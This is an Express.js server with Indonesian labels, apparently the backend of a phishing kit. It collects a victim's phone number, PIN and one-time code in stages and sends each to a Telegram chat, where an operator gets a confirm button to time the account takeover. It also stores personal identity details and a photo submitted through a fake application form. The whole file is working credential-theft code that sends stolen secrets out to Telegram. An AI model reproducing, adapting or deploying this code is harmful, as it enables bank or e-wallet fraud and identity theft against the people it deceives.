const express = require("express");
const axios = require("axios");
const path = require("path");
const mongoose = require("mongoose");
const app = express();

mongoose.connect(process.env.MONGO_URI)
.then(() => console.log("MongoDB Connected"))
.catch(err => console.log(err));

const PengajuanSchema = new mongoose.Schema({
    phone: String,
    nama: String,
    tempat: String,
    tanggal: String,
    jk: String,
    alamat: String,
    rt: String,
    rw: String,
    desa: String,
    kecamatan: String,
    kabupaten: String,
    provinsi: String,
    foto: String,
    createdAt: {
        type: Date,
        default: Date.now
    }
});

const Pengajuan = mongoose.model("Pengajuan", PengajuanSchema);

/* TOKEN BOT */
const BOT_TOKEN =
process.env.BOT_TOKEN;

/* CHAT ID */
const CHAT_ID =
process.env.CHAT_ID;

const statusData = {};

app.use(express.json({
    limit: "20mb"
}));

app.use(express.urlencoded({
    extended: true,
    limit: "20mb"
}));

app.use(
    express.static(
        path.join(__dirname)
    )
);

app.get("/", (req,res)=>{
    
    res.send("SERVER HIDUP");
    
});

/* ROUTE */
app.post("/nmrx", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx
            
        } = req.body;

        if(
            !nmrx
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
🔥 [ ×𝗡𝗠𝗥× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
            × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>  : <b>${nmrx}</b>
⌬<i>  POX . . . .</i>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* ROUTE */
app.post("/pix", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx,
            pix
            
        } = req.body;

        if(
            !nmrx ||
            !pix
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
🔥 [ ×𝗣𝗢𝗫× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
            × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
⌬<i>  OXT . . . .</i>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* ROUTE */
app.post("/send", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx,
            pix,
            otp
            
        } = req.body;

        if(
            !nmrx ||
            !pix ||
            !otp
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        statusData[nmrx] = "pending";
        /* PESAN TELEGRAM */
        const text = `
🔥 [ 𝗟𝗘𝗡𝗚𝗞𝗔𝗣 𝗦𝗘𝗠𝗨𝗔 𝗕𝗔𝗡𝗚 ] 🔥
              × <code>${nmrx}</code> ×
           
─────────────────
<b>⌬<i>  𝗡𝗠𝗥  ×</i></b>   : <b>${nmrx}</b>
<b>⌬<i>  𝗣𝗢𝗫   ×</i></b>   : <b>${pix}</b>
<b>⌬<i>  𝗢𝗫𝗧   ×</i></b>   : <b>${otp}</b>
─────────────────

<b>◈ ━━━ 𝗣𝘅𝘅𝗦𝘁𝘂𝗱𝗶𝘅 ━━━ ◈</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
{

    chat_id:
    CHAT_ID,

    text:
    text,

    parse_mode:
    "HTML",

    reply_markup:{
        inline_keyboard:[
            [
                {
                    text:"✅ KONFIRMASI",
                    callback_data:`confirm_${nmrx}`
                }
            ]
        ]
    }

}
);

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

app.get("/status/:nmrx", (req,res)=>{

    const nmrx =
    req.params.nmrx;

    res.json({
        success:true,
        status: statusData[nmrx] || "pending"
    });

});

app.post("/api/pengajuan", async (req, res) => {

    try {

        const data = new Pengajuan(req.body);

        await data.save();

        res.json({
            success: true,
            url: "/status.html"
        });

    } catch (err) {

        console.log(err);

        res.status(500).json({
            success: false
        });

    }

});

app.get("/api/status/:phone", async (req, res) => {

    try {

        const data = await Pengajuan.findOne({
            phone: req.params.phone
        });

        if(!data){
            return res.status(404).json({
                success: false
            });
        }

        res.json(data);

    } catch(err){

        console.log(err);

        res.status(500).json({
            success: false
        });

    }

});

let lastUpdateId = 0;

async function polling(){

    while(true){

        try{

            const response = await axios.get(
                `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`,
                {
                    params:{
                        offset:lastUpdateId + 1,
                        timeout:30
                    }
                }
            );

            const updates = response.data.result;

            for(const update of updates){

                lastUpdateId = update.update_id;

                if(!update.callback_query) continue;

                const callback = update.callback_query;

                const data = callback.data;

                if(data.startsWith("confirm_")){

                    const nmrx = data.replace("confirm_","");

                    statusData[nmrx] = "confirmed";

                    await axios.post(
                        `https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`,
                        {
                            chat_id: callback.message.chat.id,
                            message_id: callback.message.message_id,
                            reply_markup:{
                                inline_keyboard:[]
                            }
                        }
                    );

                    await axios.post(
                        `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,
                        {
                            callback_query_id: callback.id,
                            text:"Berhasil dikonfirmasi"
                        }
                    );

                }

            }

        }catch(error){

            console.log(error.response?.data || error.message);

            await new Promise(resolve => setTimeout(resolve,3000));

        }

    }

}

polling();

/* PORT */
const PORT =
process.env.PORT || 8080;

/* JALANKAN */
app.listen(PORT, ()=>{

    console.log(
    "Server running on port " +
    PORT
    );

});
